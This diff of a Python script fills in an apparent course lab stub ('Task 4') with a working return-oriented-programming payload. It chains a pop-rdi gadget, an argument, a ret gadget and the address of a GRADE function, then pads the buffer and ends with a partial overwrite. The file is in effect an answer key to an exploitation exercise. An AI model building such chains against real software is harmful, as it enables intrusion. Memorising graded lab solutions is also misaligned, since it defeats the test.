@@ -1,10 +1,16 @@
-#!/usr/bin/env python3
-"""Task 4: build the payload for attack/dark-log.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
 import sys
+from struct import pack
 
-payload = b""
+POP_RDI = 0x4018a3
+RET     = 0x4018a4
+GRADE   = 0x401677
 
-sys.stdout.buffer.write(payload)
+buf  = pack("<Q", POP_RDI)
+buf += pack("<Q", 4)
+buf += pack("<Q", RET)
+buf += pack("<Q", GRADE)
+buf += pack("<Q", 0)
+buf += b"A" * (0x100 - len(buf))
+buf += pack("<I", 0xa8)
+
+sys.stdout.buffer.write(buf + b"\n")
